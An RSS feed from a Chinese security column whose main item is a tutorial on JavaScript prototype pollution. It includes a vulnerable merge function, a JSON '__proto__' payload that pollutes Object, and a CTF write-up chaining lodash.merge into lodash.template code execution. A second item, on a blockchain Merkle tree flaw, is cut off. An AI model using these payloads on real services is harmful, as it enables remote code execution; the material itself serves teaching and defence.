<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description>安全攻防技术分享</description>
<language>zh-cn</language>
<lastBuildDate>Sat, 13 Apr 2019 01:43:41 +0800</lastBuildDate>
<item>
<title>深入理解 JavaScript Prototype 污染攻击</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-04-10-61990774.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/61990774&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-14cbccbc6a4bbb99662a0894ee226b0a_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt; ，就职于长亭科技&lt;/p&gt;&lt;p&gt;JavaScript是一门非常灵活的语言，我感觉在某些方面可能比PHP更加灵活。所以，除了传统的SQL注入、代码执行等注入型漏洞外，也会有一些独有的安全问题，比如今天要说这个prototype污染。&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x01-prototype__proto__&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x01 prototype和__proto__分别是什么？&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：&lt;/p&gt;&lt;p&gt;function Foo() { this.bar = 1 } new Foo() &lt;/p&gt;&lt;p&gt;&lt;code&gt;Foo&lt;/code&gt;函数的内容，就是&lt;code&gt;Foo&lt;/code&gt;类的构造函数，而&lt;code&gt;this.bar&lt;/code&gt;就是&lt;code&gt;Foo&lt;/code&gt;类的一个属性。&lt;/p&gt;&lt;blockquote&gt;为了简化编写JavaScript代码，ECMAScript 6后增加了&lt;code&gt;class&lt;/code&gt;语法，但&lt;code&gt;class&lt;/code&gt;其实只是一个语法糖。&lt;/blockquote&gt;&lt;p&gt;一个类必然有一些方法，类似属性&lt;code&gt;this.bar&lt;/code&gt;，我们也可以将方法定义在构造函数内部：&lt;/p&gt;&lt;p&gt;function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new Foo()).show() &lt;/p&gt;&lt;p&gt;但这样写有一个问题，就是每当我们新建一个Foo对象时，&lt;code&gt;this.show = function...&lt;/code&gt;就会执行一次，这个&lt;code&gt;show&lt;/code&gt;方法实际上是绑定在对象上的，而不是绑定在“类”中。&lt;/p&gt;&lt;p&gt;我希望在创建类的时候只创建一次&lt;code&gt;show&lt;/code&gt;方法，这时候就则需要使用原型（prototype）了：&lt;/p&gt;&lt;p&gt;function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() &lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;325&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;554&quot; data-original=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;325&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;554&quot; data-original=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-592e9ec1083e88ef2c5c5cebbece337e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;我们可以认为原型&lt;code&gt;prototype&lt;/code&gt;是类&lt;code&gt;Foo&lt;/code&gt;的一个属性，而所有用&lt;code&gt;Foo&lt;/code&gt;类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的&lt;code&gt;foo&lt;/code&gt;对象，其天生就具有&lt;code&gt;foo.show()&lt;/code&gt;方法。&lt;/p&gt;&lt;p&gt;我们可以通过&lt;code&gt;Foo.prototype&lt;/code&gt;来访问&lt;code&gt;Foo&lt;/code&gt;类的原型，但&lt;code&gt;Foo&lt;/code&gt;实例化出来的对象，是不能通过prototype访问原型的。这时候，就该&lt;code&gt;__proto__&lt;/code&gt;登场了。&lt;/p&gt;&lt;p&gt;一个Foo类实例化出来的foo对象，可以通过&lt;code&gt;foo.__proto__&lt;/code&gt;属性来访问Foo类的原型，也就是说：&lt;/p&gt;&lt;p&gt;foo.__proto__ == Foo.prototype &lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fd63de1cae36e310c2dee9a314a1cfd3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;340&quot; data-rawheight=&quot;103&quot; class=&quot;content_image&quot; width=&quot;340&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fd63de1cae36e310c2dee9a314a1cfd3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;340&quot; data-rawheight=&quot;103&quot; class=&quot;content_image lazy&quot; width=&quot;340&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fd63de1cae36e310c2dee9a314a1cfd3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;所以，总结一下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;prototype&lt;/code&gt;是一个类的属性，所有类对象在实例化的时候将会拥有&lt;code&gt;prototype&lt;/code&gt;中的属性和方法&lt;/li&gt;&lt;li&gt;一个对象的&lt;code&gt;__proto__&lt;/code&gt;属性，指向这个对象所在的类的&lt;code&gt;prototype&lt;/code&gt;属性&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x02-javascript&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x02 JavaScript原型链继承&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;所有类对象在实例化的时候将会拥有&lt;code&gt;prototype&lt;/code&gt;中的属性和方法，这个特性被用来实现JavaScript中的继承机制。&lt;/p&gt;&lt;p&gt;比如：&lt;/p&gt;&lt;p&gt;function Father() { this.first_name = &amp;#39;Donald&amp;#39; this.last_name = &amp;#39;Trump&amp;#39; } function Son() { this.first_name = &amp;#39;Melania&amp;#39; } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) &lt;/p&gt;&lt;p&gt;Son类继承了Father类的&lt;code&gt;last_name&lt;/code&gt;属性，最后输出的是&lt;code&gt;Name: Melania Trump&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;总结一下，对于对象son，在调用&lt;code&gt;son.last_name&lt;/code&gt;的时候，实际上JavaScript引擎会进行如下操作：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;在对象son中寻找last_name&lt;/li&gt;&lt;li&gt;如果找不到，则在&lt;code&gt;son.__proto__&lt;/code&gt;中寻找last_name&lt;/li&gt;&lt;li&gt;如果仍然找不到，则继续在&lt;code&gt;son.__proto__.__proto__&lt;/code&gt;中寻找last_name&lt;/li&gt;&lt;li&gt;依次寻找，直到找到&lt;code&gt;null&lt;/code&gt;结束。比如，&lt;code&gt;Object.prototype&lt;/code&gt;的&lt;code&gt;__proto__&lt;/code&gt;就是&lt;code&gt;null&lt;/code&gt; &lt;/li&gt;&lt;/ol&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;296&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;296&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-5260663ac7b25022e596d9746c3f5454_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。&lt;/p&gt;&lt;p&gt;以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;每个构造函数(constructor)都有一个原型对象(prototype)&lt;/li&gt;&lt;li&gt;对象的&lt;code&gt;__proto__&lt;/code&gt;属性，指向类的原型对象&lt;code&gt;prototype&lt;/code&gt;&lt;/li&gt;&lt;li&gt;JavaScript使用prototype链实现继承机制&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x03&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x03 原型链污染是什么&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;第一章中说到，&lt;code&gt;foo.__proto__&lt;/code&gt;指向的是&lt;code&gt;Foo&lt;/code&gt;类的&lt;code&gt;prototype&lt;/code&gt;。那么，如果我们修改了&lt;code&gt;foo.__proto__&lt;/code&gt;中的值，是不是就可以修改Foo类呢？&lt;/p&gt;&lt;p&gt;做个简单的实验：&lt;/p&gt;&lt;p&gt;// foo是一个简单的JavaScript对象 let foo = {bar: 1} // foo.bar 此时为1 console.log(foo.bar) // 修改foo的原型（即Object） foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1 console.log(foo.bar) // 此时再用Object创建一个空的zoo对象 let zoo = {} // 查看zoo.bar console.log(zoo.bar) &lt;/p&gt;&lt;p&gt;最后，虽然zoo是一个&lt;b&gt;空&lt;/b&gt;对象&lt;code&gt;{}&lt;/code&gt;，但&lt;code&gt;zoo.bar&lt;/code&gt;的结果居然是2：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;537&quot; data-rawheight=&quot;440&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;537&quot; data-original=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;537&quot; data-rawheight=&quot;440&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;537&quot; data-original=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-e72846c5e6d590c392d2a1d01893e942_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;原因也显而易见：因为前面我们修改了foo的原型&lt;code&gt;foo.__proto__.bar = 2&lt;/code&gt;，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。&lt;/p&gt;&lt;p&gt;后来，我们又用Object类创建了一个zoo对象&lt;code&gt;let zoo = {}&lt;/code&gt;，zoo对象自然也有一个bar属性了。&lt;/p&gt;&lt;p&gt;那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是&lt;b&gt;原型链污染&lt;/b&gt;。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x04&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x04 哪些情况下原型链会被污染？&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？&lt;/p&gt;&lt;p&gt;我们思考一下，哪些情况下我们可以设置&lt;code&gt;__proto__&lt;/code&gt;的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;对象merge&lt;/li&gt;&lt;li&gt;对象clone（其实内核就是将待操作的对象merge到一个空对象中）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;以对象merge为例，我们想象一个简单的merge函数：&lt;/p&gt;&lt;p&gt;function merge(target, source) { for (let key in source) { if (key in source &amp;amp;&amp;amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } &lt;/p&gt;&lt;p&gt;在合并的过程中，存在赋值的操作&lt;code&gt;target[key] = source[key]&lt;/code&gt;，那么，这个key如果是&lt;code&gt;__proto__&lt;/code&gt;，是不是就可以原型链污染呢？&lt;/p&gt;&lt;p&gt;我们用如下代码实验一下：&lt;/p&gt;&lt;p&gt;let o1 = {} let o2 = {a: 1, &amp;#34;__proto__&amp;#34;: {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) &lt;/p&gt;&lt;p&gt;结果是，合并虽然成功了，但原型链没有被污染：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;500&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;624&quot; data-original=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;624&quot; data-rawheight=&quot;500&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;624&quot; data-original=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-0bfd885d1307e17fadfa6912b8c481c0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;这是因为，我们用JavaScript创建o2的过程（&lt;code&gt;let o2 = {a: 1, &amp;#34;__proto__&amp;#34;: {b: 2}}&lt;/code&gt;）中，&lt;code&gt;__proto__&lt;/code&gt;已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是&lt;code&gt;[a, b]&lt;/code&gt;，&lt;code&gt;__proto__&lt;/code&gt;并不是一个key，自然也不会修改Object的原型。&lt;/p&gt;&lt;p&gt;那么，如何让&lt;code&gt;__proto__&lt;/code&gt;被认为是一个键名呢？&lt;/p&gt;&lt;p&gt;我们将代码改成如下：&lt;/p&gt;&lt;p&gt;let o1 = {} let o2 = JSON.parse(&amp;#39;{&amp;#34;a&amp;#34;: 1, &amp;#34;__proto__&amp;#34;: {&amp;#34;b&amp;#34;: 2}}&amp;#39;) merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) &lt;/p&gt;&lt;p&gt;可见，新建的o3对象，也存在b属性，说明Object已经被污染：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;430&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;650&quot; data-original=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;430&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;650&quot; data-original=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;这是因为，JSON解析的情况下，&lt;code&gt;__proto__&lt;/code&gt;会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。&lt;/p&gt;&lt;p&gt;merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x05-code-breaking-2018-thejs&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x05 Code-Breaking 2018 Thejs 分析&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这里&lt;/a&gt;）：&lt;/p&gt;&lt;p&gt;// ... const lodash = require(&amp;#39;lodash&amp;#39;) // ... app.engine(&amp;#39;ejs&amp;#39;, function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =&amp;gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) }) }) //... app.all(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; { let data = req.session.data || {language: [], category: []} if (req.method == &amp;#39;POST&amp;#39;) { data = lodash.merge(data, req.body) req.session.data = data } res.render(&amp;#39;index&amp;#39;, { language: data.language, category: data.category }) }) &lt;/p&gt;&lt;p&gt;lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;lodash.template&lt;/code&gt; 一个简单的模板引擎&lt;/li&gt;&lt;li&gt;&lt;code&gt;lodash.merge&lt;/code&gt; 函数或对象的合并&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。&lt;/p&gt;&lt;p&gt;而这里的&lt;code&gt;lodash.merge&lt;/code&gt;操作实际上就存在原型链污染漏洞。&lt;/p&gt;&lt;p&gt;在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的&lt;code&gt;lodash.template&lt;/code&gt;中。我们看到&lt;code&gt;lodash.template&lt;/code&gt;的代码：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/lodash/lodash/blob/4.17.4-npm/template.js%23L165&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/lodash/lodas&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;h/blob/4.17.4-npm/template.js#L165&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;// Use a sourceURL for easier debugging. var sourceURL = &amp;#39;sourceURL&amp;#39; in options ? &amp;#39;//# sourceURL=&amp;#39; + options.sourceURL + &amp;#39;\n&amp;#39; : &amp;#39;&amp;#39;; // ... var result = attempt(function() { return Function(importsKeys, sourceURL + &amp;#39;return &amp;#39; + source) .apply(undefined, importsValues); }); &lt;/p&gt;&lt;p&gt;options是一个对象，sourceURL取到了其&lt;code&gt;options.sourceURL&lt;/code&gt;属性。这个属性原本是没有赋值的，默认取空字符串。&lt;/p&gt;&lt;p&gt;但因为原型链污染，我们可以给所有Object对象中都插入一个&lt;code&gt;sourceURL&lt;/code&gt;属性。最后，这个&lt;code&gt;sourceURL&lt;/code&gt;被拼接进&lt;code&gt;new Function&lt;/code&gt;的第二个参数中，造成任意代码执行漏洞。&lt;/p&gt;&lt;p&gt;我将带有&lt;code&gt;__ptoto__&lt;/code&gt;的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;122&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;122&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;可见，我们代码执行成功，返回了id命令的结果。&lt;/p&gt;&lt;p&gt;整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。&lt;/p&gt;&lt;p&gt;我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%23_1&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;相关文章&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/HoLyVieR/pro&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;totype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/2802&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xz.aliyun.com/t/2802&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/2735&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xz.aliyun.com/t/2735&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-04-10-61990774</guid>
<pubDate>Wed, 10 Apr 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>区块链公链审计过程中遇到的Merkle Tree底层实现问题 及CVE-2012-2459分析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-03-22-60064645.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/60064645&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c3847e11fc0d5797a282550a8883f5c2_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者： Sissel，长亭科技区块链安全研究员&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;前言&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;区块链项目态势汹涌，在经历了比特币、以太坊时代之后，大量拥有着不同特点与优势的公链项目如雨后春笋般层出不穷，吸引着人们的眼球。&lt;/p&gt;&lt;p&gt;这些项目既拥有区块链1.0、2.0时代中，数字货币交易、去中心化、支持智能合约的特征，也通过更加巧妙的共识机制、更复杂的技术和金融模型，来解决现有的种种问题，助区块链技术步入我们的生活。&lt;/p&gt;&lt;p&gt;&lt;b&gt;在此期间，长亭科技区块链安全组也在关注着诸多公链项目，为这些公链项目的发展与上线保驾护航。&lt;/b&gt;在此前一项公链审计的项目过程中，我们发现了一个有意思的关于 Merkle Tree 底层实现漏洞。下面将分享发现该漏洞的前期技术积累，以及发现过程。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;公链项目审计&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回顾2018年，对于区块链安全从业人员而言，大部分人印象颇深的可能都是以太坊的诸多合约漏洞，EOS 公链上层出不穷的合约问题，以及少数公链漏洞信息。使用搜索引擎查找和区块链相关的审计类文章，也大多为智能合约的 checklist、智能合约的审计分析等，针对公链审计类的技术分享并无很多。&lt;b&gt;这里推荐大家一份由长亭科技编写的国内首发的&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651371613%26idx%3D1%26sn%3Dc28a33f408fa34988e6fcc2082f56238%26chksm%3D8d39c9d5ba4e40c30ebfc4cdd864474ea7e10d9dc1793d052ca9803fe90cb1e985fe33f3ae00%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;《区块链安全生存指南》&lt;/a&gt;，其中介绍了当下区块链行业环境，以及近年来区块链业内的一些著名事件等。同时分享长亭科技日前发布的&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651372563%26idx%3D2%26sn%3D5496dcfd278c2d11c8cad17aee99fb23%26chksm%3D8d39cd9bba4e448d8ced57e6dfa7df8bd905d24c71d46a3025f900f1f9e91057eeffa70abada%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;《公链审计checklist》&lt;/a&gt;，以供公链项目开发者参考。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;审计区块链公链项目，与通常的软件代码审计略有不同。通常的代码审计，我们会考虑语言特性以及该语言的 0day 或 1day 